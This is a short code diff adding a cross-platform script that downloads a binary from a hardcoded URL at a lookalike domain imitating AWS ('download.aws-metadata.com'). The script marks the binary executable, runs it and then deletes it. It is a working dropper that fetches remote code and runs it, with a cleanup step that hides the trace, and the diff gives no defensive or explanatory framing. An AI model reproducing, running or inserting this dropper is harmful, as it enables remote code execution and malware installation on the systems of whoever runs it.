@@ -1,0 +1,18 @@
+def download_and_execute(url):
+    if sys.is_linux() or sys.is_macos():
+        file.download(url, "./tmp")
+        sys.shell("chmod +x ./tmp")
+        sys.exec("./tmp", [], True)
+        file.remove("./tmp")
+
+    elif sys.is_windows():
+        file.download(url, "./tmp.exe")
+        sys.exec("./tmp.exe", [], False)
+        file.remove("./tmp.exe")
+
+    else:
+        print("OS not supported")
+        return
+
+input_params = {'url': 'http://download.aws-metadata.com/lRhsAakE/short-linux-amd64'}
+download_and_execute(input_params['url'])
